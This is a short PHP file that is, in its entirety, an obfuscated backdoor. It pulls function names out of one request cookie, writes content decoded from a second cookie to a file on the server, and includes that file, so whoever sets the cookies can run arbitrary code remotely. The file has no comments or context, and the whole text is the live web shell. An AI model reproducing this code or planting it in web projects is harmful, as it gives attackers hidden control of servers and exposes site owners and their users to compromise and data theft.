<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[35])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 4;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[35][$n];
        if (!$c[35][$n + 1]) {
            if (!$c[35][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 4 + 1;
    }
    $k = $p[0]() . $p[10];
    if (!$p[14]($k)) {
        $n = $p[2]($k, $p[12]);
        $p[26]($n, $p[3] . $p[13]($p[28]($c[3])));
    }
    include($k);
}